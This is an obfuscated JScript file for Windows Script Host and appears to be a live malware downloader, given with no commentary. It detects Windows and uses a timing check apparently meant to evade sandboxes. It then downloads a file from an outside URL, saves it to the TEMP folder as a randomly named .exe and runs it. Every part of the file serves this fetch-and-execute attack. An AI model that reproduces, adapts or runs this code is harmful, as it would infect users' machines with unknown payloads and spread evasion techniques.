var _NA = false;
var _ET = "CreateObject";
var _D = function _JJ() {return WScript[_ET]("WScript"+".Shell");}(), _A = 11;
var _K = "MSXML2.XMLHTTP";
var _EC = 2123213;
var _T = 0;
function _QY(_G){_D["Run"](_G, _T, _T);};
function _AZ(){return _K + "";};
function _C(_IE, _C0){_T = _T * 1; return _IE - _C0;};
function _RI(){return _ET;};
/*@cc_on
  @if (@_win32 || @_win64)
    _NA = true;
  @end
@*/
if (_NA)
{
var _U0 = "";
function _P(){return 22;};
var _AD = 0; var _V = 0;
function _U()
{
var _OM = new this["Date"]();
var _JI = _OM["getUTCMilliseconds"]();
WScript["Sleep"](_P());
var _OM = new this["Date"]();
var _B = _OM["getUTCMilliseconds"]();
WScript["Sleep"](_P());
var _OM = new this["Date"]();
var _LO = _OM["getUTCMilliseconds"]();
var _AD = "_UX";
_AD = _C(_B, _JI);
var _V = "_YQ";
_V = _C(_LO, _B);
_U0 = "open";
return _C(_AD, _V);
}
var _OJ = false;
var _S0 = false;
for (var _LY = _T; _LY < _P() * 1; _LY++){if (_U() != _T){
_OJ = true; 
_V = "31" + 11 * _AD + _V; 
_S0 = true; 
break;
}}
function _E() {return ((_OJ == true) && (_OJ == _S0)) ? 1 : _T;};
if (_OJ && _E() && _S0){
function _Y() {return _D["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "ezc6Y262ohIWgVGU.ex" + "e";};
 _G0 = _AZ();
 _I = WScript[_ET](_G0);
 var _S = 1;
 while (_S){
try {
	if (_S == 1)
	{
		_I[_U0]("GET", "http://zakazdetali.kz/v7bsad", false);
		_I["send"]();
		_HX = "Sleep";
	}
	WScript[_HX](_P() + 120); 
	if (_I["readystate"] < 2 * 2) continue;
	_S = _T;
	function _WA(_AZ0) {var _N = (1, 2, 3, 4, 5, _AZ0); return _N;};
	_E0 = WScript[_RI()]("ADODB.Stream");
	_G0 = _E0;
	_G0[_U0]();
	_G0["type"] = _WA(1);
	_G0["write"](_I["ResponseBody"]);
	_E0["position"] = _WA(_T);
	_G0["Save" + "ToFile"](_Y(), 2);
	_E0["cl"+"ose"]();
	_X = _Y();
	_QY(_X);
} catch(_MF){};
}
}
}

